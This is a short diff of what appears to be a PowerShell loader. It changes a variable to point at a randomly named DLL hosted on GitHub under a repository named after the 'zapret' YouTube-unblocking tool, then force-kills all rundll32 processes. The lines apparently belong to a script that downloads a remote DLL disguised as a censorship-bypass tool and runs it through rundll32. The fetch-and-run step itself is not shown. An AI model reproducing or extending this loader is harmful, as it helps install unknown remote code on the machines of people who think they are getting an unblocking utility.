@@ -1,4 +1,4 @@
-$DLL_URL = "https://github.com/pidarassssssssssssssssss/pedik/raw/refs/heads/main/8jdd23.dll"
+$DLL_URL = "https://github.com/aabotaaaa/zapret-youtube/raw/refs/heads/main/k9xf.dll"
 
 Get-Process rundll32 -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 
